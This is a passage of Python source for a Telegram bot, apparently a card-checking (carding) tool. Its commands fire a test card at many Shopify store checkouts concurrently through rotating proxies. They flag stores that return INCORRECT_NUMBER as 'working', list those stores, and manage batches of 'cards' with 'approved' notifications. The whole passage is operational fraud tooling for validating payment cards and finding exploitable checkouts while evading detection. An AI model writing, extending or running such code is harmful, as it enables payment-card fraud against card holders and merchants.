    except Exception as e:
        logger.error(f"Error in /flsite: {e}")
        await update.message.reply_text(f"❌ Error processing file: {e}")

async def cmd_reboot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "reboot"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        # Save all active batches' progress before reboot
        saved_count = 0
        try:
            async with ACTIVE_LOCK:
                active_items = list(ACTIVE_BATCHES.items())
            
            # Load current pending batches to preserve cards and sites
            pending_data = await list_pending()
            
            for batch_id, batch_info in active_items:
                try:
                    counts = batch_info.get("counts", {})
                    processed = counts.get("processed", 0)
                    total = counts.get("total", 0)
                    
                    # Skip if already completed
                    if processed >= total:
                        continue
                    
                    # Get existing pending data or create new entry
                    pending_entry = pending_data.get(str(batch_id), {})
                    
                    # Update with current progress
                    pending_entry["batch_id"] = str(batch_id)
                    pending_entry["processed"] = processed
                    pending_entry["user_id"] = batch_info.get("user_id")
                    pending_entry["chat_id"] = batch_info.get("chat_id")
                    pending_entry["title"] = counts.get("title") or "Batch"
                    
                    # Preserve cards and sites if they exist in pending
                    # (They should already be there from when batch started)
                    if "cards" not in pending_entry:
                        pending_entry["cards"] = []
                    if "sites" not in pending_entry:
                        pending_entry["sites"] = []
                    if "send_approved_notifications" not in pending_entry:
                        pending_entry["send_approved_notifications"] = True
                    
                    # Save updated pending entry
                    await add_pending(str(batch_id), pending_entry)
                    saved_count += 1
                    
                    logger.info(f"Saved batch {batch_id} progress: {processed}/{total} before reboot")
                except Exception as e:
                    logger.error(f"Failed to save batch {batch_id} progress: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Error saving active batches before reboot: {e}")
        
        status_msg = f"🔄 Rebooting bot..."
        if saved_count > 0:
            status_msg += f"\n\n✅ Saved progress for {saved_count} active batch(es). They will resume after restart."
        else:
            status_msg += "\n\nActive batches will resume after restart."
        
        await update.message.reply_text(status_msg)

        app = context.application
        if app:
            app.stop_running()
            app.shutdown()

        import sys
        import os
        import platform
        
        python = sys.executable
        script_path = os.path.abspath(__file__)
        
        # On Windows, os.execv doesn't work - use subprocess instead
        if platform.system() == "Windows":
            import subprocess
            try:
                # Start new process and exit current one
                subprocess.Popen([python, script_path], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
                # Give it a moment to start, then exit
                await asyncio.sleep(1)
                os._exit(0)
            except Exception as e:
                logger.error(f"Failed to reboot on Windows: {e}")
                await update.message.reply_text(f"⚠️ Reboot initiated but may need manual restart. Error: {e}")
        else:
            # On Unix-like systems, use os.execv
            try:
                os.execv(python, [python, script_path])
            except Exception as e:
                logger.error(f"Failed to reboot: {e}")
                await update.message.reply_text(f"⚠️ Reboot failed: {e}")
    except Exception as e:
        await update.message.reply_text(f"Failed to reboot: {e}")

async def cmd_resetactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "resetactive"):
        await update.message.reply_text("Unauthorized.")
        return

    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())

    if not items:
        await update.message.reply_text("No active checks to reset.")
        return

    reset = 0
    for batch_id, rec in items:
        try:
            ev = rec.get("event")
            if ev:
                ev.set()
        except Exception:
            pass
        try:
            for t in rec.get("tasks", []):
                if not t.done():
                    t.cancel()
        except Exception:
            pass
        try:
            prog = rec.get("progress") or (None, None)
            chat_id, msg_id = prog
            if chat_id and msg_id:
                try:
                    await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            await remove_pending(batch_id)
        except Exception:
            pass
        reset += 1

    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES.clear()
    except Exception:
        pass

    await update.message.reply_text(f"Reset requested for {reset} active batch(es).")

async def cmd_stopall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "stopall"):
        await update.message.reply_text("Unauthorized.")
        return

    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())

    if not items:
        await update.message.reply_text("No active checks to stop.")
        return

    stopped = 0
    for batch_id, rec in items:
        try:
            ev = rec.get("event")
            if ev:
                ev.set()
        except Exception:
            pass
        try:
            for t in rec.get("tasks", []):
                if not t.done():
                    t.cancel()
        except Exception:
            pass
        try:
            prog = rec.get("progress") or (None, None)
            chat_id, msg_id = prog
            if chat_id and msg_id:
                try:
                    await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            await remove_pending(batch_id)
        except Exception:
            pass
        stopped += 1

    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES.clear()
    except Exception:
        pass

    await update.message.reply_text(f"Stop requested for {stopped} active batch(es).")

async def cmd_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    args = context.args or []
    show_all = "all" in [a.lower() for a in args]
    
    if show_all and not is_admin(user.id):
        await update.message.reply_text("❌ Only admins can use '/site all'")
        return
    
    search_term = None
    for arg in args:
        if arg.lower() != "all":
            search_term = arg.lower()
            break
        
    try:
        sites = checkout.read_sites_from_file("working_sites.txt")
        site_count = len(sites) if sites else 0
        
        cached_count = 0
        try:
            with BOT_PRODUCT_CACHE_LOCK:
                cached_count = len(BOT_PRODUCT_CACHE)
        except Exception:
            pass
        
        msg = f"📊 <b>Active Sites Report</b>\n\n"
        msg += f"Total sites in file: <b>{site_count}</b>\n"
        msg += f"Cached products: <b>{cached_count}</b>\n"
        
        if search_term and sites:
            matching = [s for s in sites if search_term in s.lower()]
            if matching:
                msg += f"\n🔍 <b>Found '{search_term}':</b>\n"
                for site in matching[:10]:
                    domain = site.replace("https://", "").replace("http://", "").split("/")[0]
                    msg += f"  • {domain}\n"
                if len(matching) > 10:
                    msg += f"  ... and {len(matching) - 10} more\n"
            else:
                msg += f"\n❌ No sites found matching '{search_term}'"
        elif show_all:
            # Send working_sites.txt as a file
            try:
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
                    # Write all sites to the file (one per line)
                    if sites:
                        for site in sites:
                            tmp.write(site + "\n")
                    # If no sites, file will be empty
                    tmp_path = tmp.name
                
                try:
                    with open(tmp_path, 'rb') as f:
                        caption = f"📁 working_sites.txt\n\nTotal sites: {site_count}"
                        if site_count == 0:
                            caption += "\n⚠️ File is empty"
                        await update.message.reply_document(
                            document=f,
                            filename="working_sites.txt",
                            caption=caption
                        )
                finally:
                    try:
                        os.unlink(tmp_path)
                    except Exception:
                        pass
                return
            except Exception as e:
                logger.error(f"Error sending working_sites.txt file: {e}")
                msg += f"\n❌ Error sending file: {e}\n"
                # Fall through to show text version
        
        if not search_term:
            msg += f"\n💡 Usage:\n"
            msg += f"  /site - Show count\n"
            msg += f"  /site all - Get working_sites.txt file\n"
            msg += f"  /site venus - Search for 'venus'"
        
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in /site command: {e}")
        await update.message.reply_text(f"Failed to check sites: {e}")

def extract_and_validate_urls(text: str) -> List[str]:
    """
    Extract and validate URLs from text, handling numbered lists and various formats.
    
    Handles:
    - Numbered lists: "26. https://site.com"
    - Plain URLs: "https://site.com"
    - URLs without protocol: "site.com"
    - Multiple URLs per line
    - Shopify-specific URLs (collections, products, etc.)
    """
    import re
    from urllib.parse import urlparse, urlunparse
    
    if not text or not text.strip():
        return []
    
    urls = []
    seen = set()
    
    # Pattern to match URLs (including those with numbering)
    # Matches: number. http://..., number) http://..., or just http://...
    url_patterns = [
        # Numbered list format: "26. https://..." or "26) https://..."
        r'(?:^\d+[\.\)]\s*)?(https?://[^\s<>"\'\)]+)',
        # URL without protocol but with domain
        r'(?:^\d+[\.\)]\s*)?([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:myshopify\.com|shopify\.com)[^\s<>"\'\)]*)',
        # General domain pattern
        r'(?:^\d+[\.\)]\s*)?([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:[a-zA-Z]{2,})[^\s<>"\'\)]*)',
    ]
    
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        # Try to extract URLs from the line
        for pattern in url_patterns:
            matches = re.finditer(pattern, line, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                url_candidate = match.group(1) if match.lastindex else match.group(0)
                
                # Clean up the URL
                url_candidate = url_candidate.strip()
                
                # Remove trailing punctuation that might be part of sentence
                url_candidate = url_candidate.rstrip('.,;:!?)')
                
                # Skip if too short or doesn't look like a URL
                if len(url_candidate) < 4:
                    continue
                
                # Normalize URL
                normalized = normalize_url(url_candidate)
                if normalized and normalized not in seen:
                    seen.add(normalized)
                    urls.append(normalized)
    
    return urls

def mask_proxy(proxy_url: Optional[str]) -> str:
    """Mask proxy credentials for display"""
    if not proxy_url:
        return "No proxy"
    
    try:
        if '@' in proxy_url:
            parts = proxy_url.split('@')
            return f"***@{parts[1]}"
        else:
            # Handle http://proxy:port format
            proxy_clean = proxy_url.replace('http://', '').replace('https://', '')
            if ':' in proxy_clean:
                parts = proxy_clean.split(':')
                if len(parts) >= 2:
                    return f"{parts[0]}:{parts[1]}"
            return "Proxy"
    except Exception:
        return "Proxy"

def format_response_info(amount: Optional[str], code: Optional[str], status: Optional[str]) -> str:
    """Format response info similar to scraper format"""
    parts = []
    
    if amount and amount != 'N/A' and amount != 'Unknown':
        parts.append(amount)
    
    if status and status.lower() not in ['unknown', 'error']:
        parts.append(f"✓ Checkout OK")
    
    # Try to extract product name from code if it contains product info
    if code:
        code_str = str(code)
        # Look for product name patterns in the code
        if 'product' in code_str.lower() or 'title' in code_str.lower():
            # Try to extract product name (simplified)
            if len(code_str) > 50:
                product_name = code_str[:50].strip()
            else:
                product_name = code_str.strip()
            if product_name and product_name not in parts:
                parts.append(product_name)
        elif len(code_str) < 100:
            parts.append(code_str)
    
    if not parts:
        return "Unknown"
    
    return " | ".join(parts)

def parse_amount(amount_display: Optional[str]) -> Optional[float]:
    """Extract numeric value from amount_display string (e.g., '$10.00' -> 10.0)"""
    if not amount_display:
        return None
    try:
        # Remove currency symbols and whitespace
        amount_str = str(amount_display).replace('$', '').replace(',', '').strip()
        # Extract first number (in case there are multiple)
        match = re.search(r'(\d+\.?\d*)', amount_str)
        if match:
            return float(match.group(1))
    except Exception:
        pass
    return None

def normalize_url(url_input: str) -> Optional[str]:
    """
    Normalize and validate a URL.
    For Shopify sites, strips collection/product paths and returns base domain.
    Returns None if URL is invalid.
    """
    import re
    from urllib.parse import urlparse, urlunparse
    
    if not url_input or not url_input.strip():
        return None
    
    url_input = url_input.strip()
    
    # Remove common prefixes/patterns
    # Handle: "26. https://..." -> "https://..."
    url_input = re.sub(r'^\d+[\.\)]\s*', '', url_input)
    url_input = url_input.strip()
    
    # Remove trailing punctuation
    url_input = url_input.rstrip('.,;:!?)')
    
    # If it doesn't start with http, add https
    if not url_input.startswith(('http://', 'https://')):
        # Check if it looks like a domain
        if '.' in url_input and not url_input.startswith('.'):
            url_input = f"https://{url_input}"
        else:
            return None
    
    try:
        parsed = urlparse(url_input)
        
        # Validate we have at least a netloc (domain)
        if not parsed.netloc:
            return None
        
        domain = parsed.netloc.lower()
        
        # Additional validation: check if it's a valid domain format
        if not domain or len(domain) < 3:
            return None
        
        # Filter out obviously invalid domains
        if domain.startswith('.') or domain.endswith('.'):
            return None
        
        # Check if it's a Shopify site
        is_shopify = '.myshopify.com' in domain or '.shopify.com' in domain
        
        if is_shopify:
            # Ensure it's a valid Shopify subdomain
            if domain.count('.') < 2:
                return None
            
            # For Shopify sites, strip all paths and return just base domain
            # This converts:
            # https://zishta-store.myshopify.com/collections/all-products
            # -> https://zishta-store.myshopify.com/
            normalized = urlunparse((
                'https',
                domain,
                '/',  # Always use root path for Shopify sites
                '',   # No params
                '',   # No query
                ''    # No fragment
            ))
        else:
            # For non-Shopify sites, keep the path but normalize
            normalized = urlunparse((
                'https' if parsed.scheme in ('http', 'https') else parsed.scheme or 'https',
                domain,
                parsed.path.rstrip('/') if parsed.path != '/' else '/',
                parsed.params,
                parsed.query,
                ''  # Remove fragment
            ))
        
        return normalized
        
    except Exception:
        return None

async def cmd_chksite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if specific sites work with the checker (supports multiple sites)"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    full_text = (update.message.text or "").strip()
    
    # Remove the command itself from the text
    if full_text.lower().startswith("/chksite"):
        full_text = full_text[8:].strip()
    
    # Use the new URL extraction function
    sites_to_check = extract_and_validate_urls(full_text)
    
    if not sites_to_check:
        await update.message.reply_text(
            "Usage: /chksite <site_url>\n\n"
            "Single site:\n"
            "  /chksite culturekings.com\n"
            "  /chksite https://zishta-store.myshopify.com/collections/all-products\n\n"
            "Multiple sites (supports numbered lists):\n"
            "  26. https://site1.com\n"
            "  27. https://site2.com/collections/products\n"
            "  28. site3.com\n\n"
            "Note: Shopify URLs are automatically converted to base domain format."
        )
        return
    
    total_sites = len(sites_to_check)
    
    # Create batch tracking for stop functionality
    import uuid
    batch_id = f"chksite_{user.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    cancel_event = asyncio.Event()
    
    # Add stop button
    stop_button = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{batch_id}")]])
    checking_msg = await update.message.reply_text(
        f"🔍 Checking {total_sites} site(s)...\n\nPlease wait...",
        reply_markup=stop_button
    )
    
    # Register in ACTIVE_BATCHES for stop functionality
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": user.id,
                "progress": (update.effective_chat.id, checking_msg.message_id),
                "type": "chksite",
                "total": total_sites,
                "completed": 0,
                "title": f"Site Check ({total_sites} sites)"
            }
    except Exception:
        pass
    
    test_card = {
        "number": "4532015112830366",
        "month": 12,
        "year": 2028,
        "verification_value": "123"
    }
    
    saved_proxies = []
    try:
        saved_proxies = await get_user_proxies(user.id)
    except Exception:
        pass
    
    semaphore = asyncio.Semaphore(200)
    completed_count = [0]
    working_count = [0]
    last_update_time = [time.time()]
    is_cancelled = [False]
    
    async def check_single_site(site_input, idx):
        async with semaphore:
            # Check for cancellation
            if cancel_event.is_set() or is_cancelled[0]:
                return {
                    "url": site_input,
                    "emoji": "⚠️",
                    "summary": "Cancelled",
                    "status": "cancelled",
                    "code": "Stopped by user",
                    "amount": None,
                    "idx": idx
                }
            
            # Minimal delay only for very first few to avoid instant burst
            if idx <= 3:
                await asyncio.sleep(random.uniform(0.05, 0.15))
            
            try:
                if not site_input.startswith("http"):
                    site_url = f"https://{site_input}"
                else:
                    site_url = site_input
                
                site_url = site_url.rstrip("/")
                
                proxies_override = None
                if saved_proxies:
                    proxy_url = saved_proxies[(idx - 1) % len(saved_proxies)]
                    proxies_override = {"http": proxy_url, "https": proxy_url}
                
                loop = asyncio.get_event_loop()
                status, code_display, amount_display, site_label, used_proxy, final_site, receipt_id = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    test_card,
                    [site_url],
                    proxies_override,
                    None
                )
                
                # List of error codes that should NOT be considered as working
                non_working_errors = [
                    "DELIVERY_ADDRESS2_REQUIRED",
                    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED",
                    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
                    "DELIVERY_COMPANY_REQUIRED"
                ]
                
                code_str = str(code_display).upper()
                has_non_working_error = any(err in code_str for err in non_working_errors)
                
                # Only mark as working if code is INCORRECT_NUMBER
                if "INCORRECT_NUMBER" in code_str:
                    emoji = "✅"
                    summary = f"{status.upper() if status else 'WORKING'} - {code_display[:50]}"
                    working_count[0] += 1
                elif "No product" in str(code_display) or "no variant" in str(code_display).lower():
                    emoji = "⚠️"
                    summary = "No Products"
                elif has_non_working_error:
                    emoji = "❌"
                    summary = f"Not Supported - {code_display[:50]}"
                elif "timeout" in str(code_display).lower() or "connect" in str(code_display).lower():
                    emoji = "❌"
                    summary = "Connection Failed"
                else:
                    emoji = "❌"
                    summary = f"Failed - {code_display[:50] if code_display else 'Unknown'}"
                
                completed_count[0] += 1
                
                # Update ACTIVE_BATCHES
                try:
                    async with ACTIVE_LOCK:
                        if batch_id in ACTIVE_BATCHES:
                            ACTIVE_BATCHES[batch_id]["completed"] = completed_count[0]
                except Exception:
                    pass
                
                # Update message less frequently to reduce overhead
                current_time = time.time()
                if total_sites > 3 and (completed_count[0] % 50 == 0 or (current_time - last_update_time[0]) >= 3.0):
                    last_update_time[0] = current_time
                    try:
                        # Skip update if cancelled
                        if not cancel_event.is_set() and not is_cancelled[0]:
                            async with ACTIVE_LOCK:
                                if batch_id in ACTIVE_BATCHES and not ACTIVE_BATCHES[batch_id].get("cancelled"):
                                    await checking_msg.edit_text(
                                        f"🔍 Checking sites in parallel...\n\n✅ Completed: {completed_count[0]}/{total_sites}\n💚 Working: {working_count[0]}",
                                        reply_markup=stop_button
                                    )
                    except Exception:
                        pass
                
                return {
                    "url": site_url,
                    "emoji": emoji,
                    "summary": summary,
                    "status": status,
                    "code": code_display,
                    "amount": amount_display,
                    "proxy": used_proxy,
                    "response_info": format_response_info(amount_display, code_display, status),
                    "idx": idx
                }
                
            except Exception as e:
                completed_count[0] += 1
                return {
                    "url": site_url if 'site_url' in locals() else site_input,
                    "emoji": "❌",
                    "summary": f"Error: {str(e)[:50]}",
                    "status": "error",
                    "code": str(e),
                    "amount": None,
                    "proxy": None,
                    "response_info": f"Error: {str(e)[:50]}",
                    "idx": idx
                }
    
    tasks = [check_single_site(site, idx) for idx, site in enumerate(sites_to_check, 1)]
    
    # Store tasks in ACTIVE_BATCHES for cancellation
    try:
        async with ACTIVE_LOCK:
            if batch_id in ACTIVE_BATCHES:
                ACTIVE_BATCHES[batch_id]["tasks"] = tasks
    except Exception:
        pass
    
    try:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter out exceptions and cancellations
        processed_results = []
        for r in results:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, dict):
                processed_results.append(r)
        results = processed_results
    except asyncio.CancelledError:
        is_cancelled[0] = True
        # Still try to get partial results
        results = [r for r in results if isinstance(r, dict)] if 'results' in locals() else []
    
    # Check if cancelled
    was_cancelled = cancel_event.is_set() or is_cancelled[0]
    
    results = sorted(results, key=lambda x: x.get("idx", 0))
    
    working = sum(1 for r in results if r["emoji"] == "✅")
    no_products = sum(1 for r in results if r["emoji"] == "⚠️")
    failed = sum(1 for r in results if r["emoji"] == "❌")
    cancelled = sum(1 for r in results if r.get("status") == "cancelled")
    
    # Format results like /scr command
    working_results = [r for r in results if r["emoji"] == "✅"]
    
    # Create file with /scr format
    file_content = f"# Site Check Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    file_content += f"# Total Checked: {len(results)}\n"
    file_content += f"# Working Sites: {working}\n"
    file_content += f"# Failed Sites: {failed + no_products}\n"
    file_content += "=" * 80 + "\n\n"
    
    if working_results:
        file_content += "# WORKING SITES\n"
        file_content += "=" * 80 + "\n"
        for result in sorted(working_results, key=lambda x: x["url"]):
            file_content += f"{result['url']}\n"
        
        file_content += "\n" + "=" * 80 + "\n\n"
        file_content += "# DETAILED RESPONSE INFO\n"
        file_content += "=" * 80 + "\n"
        for result in sorted(working_results, key=lambda x: x["url"]):
            response_info = result.get("response_info", "Unknown")
            proxy_display = mask_proxy(result.get("proxy"))
            
            file_content += f"\n{result['url']}\n"
            file_content += f"  Response: {response_info}\n"
            file_content += f"  Proxy: {proxy_display}\n"
    else:
        file_content += "\nNo working sites found.\n"
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
        tmp.write(file_content)
        tmp_path = tmp.name
    
    try:
        # Remove stop button and update final message
        status_emoji = "⚠️" if was_cancelled else "✅"
        status_text = "Stopped" if was_cancelled else "Check complete"
        
        summary_parts = [f"✅ Working: {working}", f"⚠️ No Products: {no_products}", f"❌ Failed: {failed}"]
        if was_cancelled and cancelled > 0:
            summary_parts.append(f"⏹ Cancelled: {cancelled}")
        
        await checking_msg.edit_text(
            f"{status_emoji} {status_text}! Sending results as files...\n\n<b>Summary:</b>\n" + "\n".join(summary_parts),
            parse_mode=ParseMode.HTML,
            reply_markup=None  # Remove stop button
        )
        
        # Send results file
        with open(tmp_path, 'rb') as f:
            caption_parts = [f"📊 Site Check Results", "", f"✅ Working: {working}", f"⚠️ No Products: {no_products}", f"❌ Failed: {failed}"]
            if was_cancelled:
                caption_parts.append(f"⏹ Cancelled: {cancelled}")
            await update.message.reply_document(
                document=f,
                filename=f"site_check_results_{total_sites}_sites.txt",
                caption="\n".join(caption_parts)
            )
    finally:
        # Clean up from ACTIVE_BATCHES
        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES.pop(batch_id, None)
        except Exception:
            pass
        
        try:
            os.remove(tmp_path)
        except Exception:
            pass

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check URLs from a txt file (use by replying to a txt file with /chk)"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Please reply to a .txt file with /chk")
        return
    
    doc = update.message.reply_to_message.document
    file_name = doc.file_name or ""
    
    if not file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ Please reply to a .txt file (not other file types).")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w+b', suffix='.txt', delete=False) as tmp:
            tmp_path = tmp.name
        await file.download_to_drive(custom_path=tmp_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {e}")
        return
    
    try:
        with open(tmp_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        
        # Use the new URL extraction function to handle numbered lists and various formats
        urls = extract_and_validate_urls(file_content)
        
        if not urls:
            await update.message.reply_text(
                "❌ No valid URLs found in the file.\n\n"
                "The file should contain URLs (one per line or space-separated).\n"
                "Supports numbered lists like:\n"
                "26. https://site.com\n"
                "27. https://site2.com"
            )
            return
        
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {e}")
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        return
    
    total_urls = len(urls)
    
    # Create batch tracking for stop functionality
    import uuid
    batch_id = f"chk_{user.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    cancel_event = asyncio.Event()
    
    # Add stop button
    stop_button = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{batch_id}")]])
    checking_msg = await update.message.reply_text(
        f"🔍 Checking {total_urls} URL(s) from file...\n\nPlease wait...",
        reply_markup=stop_button
    )
    
    # Register in ACTIVE_BATCHES for stop functionality
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": user.id,
                "progress": (update.effective_chat.id, checking_msg.message_id),
                "type": "chk",
                "total": total_urls,
                "completed": 0,
                "title": f"URL Check ({total_urls} URLs)"
            }
    except Exception:
        pass
    
    test_card = {
        "number": "4532015112830366",
        "month": 12,
        "year": 2028,
        "verification_value": "123"
    }
    
    saved_proxies = []
    try:
        saved_proxies = await get_user_proxies(user.id)
    except Exception:
        pass
    
    # Increase concurrency for faster processing
    semaphore = asyncio.Semaphore(300)
    completed_count = [0]
    working_count = [0]
    last_update_time = [time.time()]
    is_cancelled = [False]
    
    async def check_single_url(url_input, idx):
        async with semaphore:
            # Check for cancellation
            if cancel_event.is_set() or is_cancelled[0]:
                return {
                    "url": url_input,
                    "emoji": "⚠️",
                    "summary": "Cancelled",
                    "status": "cancelled",
                    "code": "Stopped by user",
                    "amount": None,
                    "idx": idx
                }
            
            # Minimal delay only for very first few to avoid instant burst
            if idx <= 5:
                await asyncio.sleep(random.uniform(0.05, 0.15))
            
            try:
                if not url_input.startswith("http"):
                    site_url = f"https://{url_input}"
                else:
                    site_url = url_input
                
                site_url = site_url.rstrip("/")
                
                proxies_override = None
                if saved_proxies:
                    proxy_url = saved_proxies[(idx - 1) % len(saved_proxies)]
                    proxies_override = {"http": proxy_url, "https": proxy_url}
                
                loop = asyncio.get_event_loop()
                status, code_display, amount_display, site_label, used_proxy, final_site, receipt_id = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    test_card,
                    [site_url],
                    proxies_override,
                    None
                )
                
                # List of error codes that should NOT be considered as working
                non_working_errors = [
                    "DELIVERY_ADDRESS2_REQUIRED",
                    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED",
                    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
                    "DELIVERY_COMPANY_REQUIRED"
                ]
                
                code_str = str(code_display).upper()
                has_non_working_error = any(err in code_str for err in non_working_errors)
                
                # Only mark as working if code is INCORRECT_NUMBER
                if "INCORRECT_NUMBER" in code_str:
                    emoji = "✅"
                    summary = f"{status.upper() if status else 'WORKING'} - {code_display[:50]}"
                    working_count[0] += 1
                elif "No product" in str(code_display) or "no variant" in str(code_display).lower():
                    emoji = "⚠️"
                    summary = "No Products"
                elif has_non_working_error:
                    emoji = "❌"
                    summary = f"Not Supported - {code_display[:50]}"
                elif "timeout" in str(code_display).lower() or "connect" in str(code_display).lower():
                    emoji = "❌"
                    summary = "Connection Failed"
                else:
                    emoji = "❌"
                    summary = f"Failed - {code_display[:50] if code_display else 'Unknown'}"
                
                completed_count[0] += 1
                
                # Update ACTIVE_BATCHES
                try:
                    async with ACTIVE_LOCK:
                        if batch_id in ACTIVE_BATCHES:
                            ACTIVE_BATCHES[batch_id]["completed"] = completed_count[0]
                except Exception:
                    pass
                
                # Update message less frequently to reduce overhead (every 3 seconds or 100 completions)
                # Skip update if cancelled
                if not cancel_event.is_set() and not is_cancelled[0]:
                    current_time = time.time()
                    if total_urls > 3 and (completed_count[0] % 100 == 0 or (current_time - last_update_time[0]) >= 3.0):
                        last_update_time[0] = current_time
                        try:
                            # Check if still not cancelled before updating
                            async with ACTIVE_LOCK:
                                if batch_id in ACTIVE_BATCHES and not ACTIVE_BATCHES[batch_id].get("cancelled"):
                                    await checking_msg.edit_text(
                                        f"🔍 Checking URLs in parallel...\n\n✅ Completed: {completed_count[0]}/{total_urls}\n💚 Working: {working_count[0]}",
                                        reply_markup=stop_button
                                    )
                        except Exception:
                            pass
                
                return {
                    "url": site_url,
                    "emoji": emoji,
                    "summary": summary,
                    "status": status,
                    "code": code_display,
                    "amount": amount_display,
                    "proxy": used_proxy,
                    "response_info": format_response_info(amount_display, code_display, status),
                    "idx": idx
                }
                
            except Exception as e:
                completed_count[0] += 1
                return {
                    "url": site_url if 'site_url' in locals() else url_input,
                    "emoji": "❌",
                    "summary": f"Error: {str(e)[:50]}",
                    "status": "error",
                    "code": str(e),
                    "amount": None,
                    "proxy": None,
                    "response_info": f"Error: {str(e)[:50]}",
                    "idx": idx
                }
    
    tasks = [check_single_url(url, idx) for idx, url in enumerate(urls, 1)]
    
    # Store tasks in ACTIVE_BATCHES for cancellation
    try:
        async with ACTIVE_LOCK:
            if batch_id in ACTIVE_BATCHES:
                ACTIVE_BATCHES[batch_id]["tasks"] = tasks
    except Exception:
        pass
    
    try:
        # Check if cancelled before gathering
        if cancel_event.is_set():
            is_cancelled[0] = True
        
        # Wait for tasks with proper cancellation handling
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            is_cancelled[0] = True
            # Get partial results from completed tasks
            results = []
            for t in tasks:
                if t.done():
                    try:
                        r = await t
                        if isinstance(r, dict):
                            results.append(r)
                    except Exception:
                        pass
        
        # Filter out exceptions
        processed_results = []
        for r in results:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, dict):
                processed_results.append(r)
        results = processed_results
    except Exception as e:
        is_cancelled[0] = True
        # Try to get any completed results
        results = []
        for t in tasks:
            if t.done():
                try:
                    r = await t
                    if isinstance(r, dict):
                        results.append(r)
                except Exception:
                    pass
    
    # Check if cancelled - check both event and ACTIVE_BATCHES
    was_cancelled = cancel_event.is_set() or is_cancelled[0]
    try:
        async with ACTIVE_LOCK:
            if batch_id in ACTIVE_BATCHES:
                if ACTIVE_BATCHES[batch_id].get("cancelled"):
                    was_cancelled = True
    except Exception:
        pass
    
    results = sorted(results, key=lambda x: x.get("idx", 0))
    
    working = sum(1 for r in results if r["emoji"] == "✅")
    no_products = sum(1 for r in results if r["emoji"] == "⚠️")
    failed = sum(1 for r in results if r["emoji"] == "❌")
    cancelled = sum(1 for r in results if r.get("status") == "cancelled")
    
    # Format results like /scr command
    working_results = [r for r in results if r["emoji"] == "✅"]
    
    # Create file with /scr format
    file_content = f"# URL Check Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    file_content += f"# Total Checked: {len(results)}\n"
    file_content += f"# Working Sites: {working}\n"
    file_content += f"# Failed Sites: {failed + no_products}\n"
    file_content += "=" * 80 + "\n\n"
    
    if working_results:
        file_content += "# WORKING SITES\n"
        file_content += "=" * 80 + "\n"
        for result in sorted(working_results, key=lambda x: x["url"]):
            file_content += f"{result['url']}\n"
        
        file_content += "\n" + "=" * 80 + "\n\n"
